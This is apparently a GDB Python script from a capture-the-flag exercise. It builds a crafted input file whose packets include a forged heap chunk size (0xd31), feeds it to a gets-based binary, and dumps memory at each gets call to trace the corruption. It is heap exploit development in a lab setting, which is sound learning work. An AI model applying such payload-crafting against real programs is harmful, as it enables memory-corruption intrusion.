import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

OPS = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd31)),
    (0x1000, b"\x00"*8),
    (0x8, b"\x00"*8),
    (0x8, b"\x00"*8),
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("/mnt/d/ctf-index/_z_441/input.bin", "wb").write(build(OPS))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        gdb.write("\n=== GETS#%d pkt=%#x ===\n" % (hits[0], rdi - 8))
        try:
            gdb.write(gdb.execute("x/10gx %#x" % (rdi - 0x38), to_string=True))
        except Exception as e:
            gdb.write("memerr %s\n" % e)
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < /mnt/d/ctf-index/_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
